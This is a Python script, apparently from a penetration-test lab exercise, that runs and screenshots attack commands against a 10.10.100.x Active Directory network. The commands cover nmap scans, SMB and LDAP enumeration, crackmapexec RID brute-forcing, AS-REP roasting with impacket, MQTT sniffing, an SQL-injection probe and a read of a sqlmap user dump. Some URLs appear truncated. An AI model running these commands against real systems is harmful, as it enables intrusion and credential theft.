import os
import subprocess
import time
import pyautogui

# Pasta centralizada onde as imagens finais vão cair
PASTA_IMAGENS = "evidencias_prints"
os.makedirs(PASTA_IMAGENS, exist_ok=True)

def executar_e_printar(nome_print, comando, delay=5):
    """Limpa a tela, roda o comando puramente na tela e captura o print após o delay."""
    # Limpa o terminal antes de cada comando para o print ficar limpo
    os.system('clear')
    
    print(f"[$] Executando: {comando}\n")
    time.sleep(1) # Pequena pausa para a limpeza de tela assentar
    
    # Executa em background para o Python conseguir disparar o print no meio do processo
    processo = subprocess.Popen(comando, shell=True, stdout=None, stderr=subprocess.STDOUT)
    
    # Aguarda o tempo necessário para o output preencher a tela do terminal
    print(f"[*] Aguardando {delay} segundos antes de tirar o print...")
    time.sleep(delay)
    
    # Tira o screenshot da tela inteira
    print_path = os.path.join(PASTA_IMAGENS, f"{nome_print}.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(print_path)
    print(f"[+] Print {nome_print} salvo! Aguardando o comando finalizar totalmente...")
    
    # Aguarda o término definitivo do comando antes de ir para o próximo
    processo.wait()

# ==============================================================================
# F01 — Descoberta da Rede
# ==============================================================================
# Aumentado para dar folga na tabela ARP
executar_e_printar("F01_arp_scan", "sudo arp-scan -l", delay=10)

# Varredura de ping da subnet inteira leva um tempo
executar_e_printar("F01_ping_sweep", "nmap -sn 10.10.100.0/24", delay=25)

# Nmap completo em 3 alvos (-p- e -sV) é pesado. Aumentado para 3 minutos (180s)
executar_e_printar(
    "F01_scan_completo", 
    "sudo nmap -sS -sV -O --open -p- -T3 10.10.100.2 10.10.100.3 10.10.100.100", 
    delay=180
)

# Nmap focado com scripts no DC
executar_e_printar(
    "F01_scan_dc", 
    "sudo nmap -sS -sV -p 53,88,135,139,389,445,464,636,3268,3269,3389,5985 --script=banner,smb-os-discovery 10.10.100.2", 
    delay=35
)

# ==============================================================================
# F02 — SMB
# ==============================================================================
executar_e_printar("F02_smb_security", "nmap -p 445 --script smb-security-mode,smb2-security-mode 10.10.100.2", delay=15)

executar_e_printar("F02_smb_shares", "smbclient -L //10.10.100.2 -N 2>/dev/null", delay=10)

executar_e_printar("F02_cme_dc", "crackmapexec smb 10.10.100.2 2>/dev/null", delay=12)

# ==============================================================================
# F03 — LDAP
# ==============================================================================
executar_e_printar("F03_ldap_bind_test", "ldapsearch -x -H ldap://10.10.100.2 -b '' -s base namingContexts 2>&1", delay=10)

# Ataques de força bruta e enumeração no AD demoram mais
executar_e_printar("F03_rid_brute", "crackmapexec smb 10.10.100.2 --rid-brute 2>/dev/null", delay=25)

executar_e_printar("F03_cme_users", "crackmapexec smb 10.10.100.2 --users 2>/dev/null", delay=25)

# ==============================================================================
# F04 — Kerberos
# ==============================================================================
executar_e_printar("F04_dns_test", "nslookup corp.local 10.10.100.2", delay=8)

executar_e_printar(
    "F04_asrep_candidates", 
    "impacket-GetNPUsers corp.local/ -usersfile F04_Kerberos/alef/userlist.txt -no-pass -dc-ip 10.10.100.2 2>/dev/null", 
    delay=15
)

executar_e_printar("F04_password_policy", "crackmapexec smb 10.10.100.2 --pass-pol 2>/dev/null", delay=15)

# ==============================================================================
# F08 — Servidor .100
# ==============================================================================
# Nmap completo em um único host. Colocado 1 minuto e meio (90s)
executar_e_printar("F08_nmap_100", "sudo nmap -sS -sV -O --open -p- -T3 10.10.100.100", delay=90)

executar_e_printar("F08_nodered_settings", "curl -s http://10.10.100", delay=10)

executar_e_printar("F08_nodered_flows", "curl -s http://10.10.100", delay=10)

# O timeout do comando é de 10 segundos, tiramos o print no segundo 8 para pegar o fluxo cheio
executar_e_printar(
    "F08_mqtt_topics", 
    "timeout 10 mosquitto_sub -h 10.10.100.100 -p 1883 -t '#' -v 2>/dev/null", 
    delay=8
)

executar_e_printar("F08_sqli_test", "curl -s \"http://10.10.100'\"", delay=8)

executar_e_printar("F08_users_dump", "cat /root/.local/share/sqlmap/output/10.10.100.100/dump/portal_operacoes/users.csv", delay=6)

executar_e_printar("F08_http_headers", "curl -s -I http://10.10.100", delay=6)

# ==============================================================================
# F09 — Script Python
# ==============================================================================
# Seu scanner customizado rodando. Aumentado para dar tempo de listar os achados na tela
executar_e_printar("F09_scanner_output", "python3 cymag_v2.py 10.10.100.100 2>&1", delay=30)

os.system('clear')
print(f"\n[+] Tudo pronto! Os prints com tempo estendido foram salvos na pasta: ./{PASTA_IMAGENS}/")
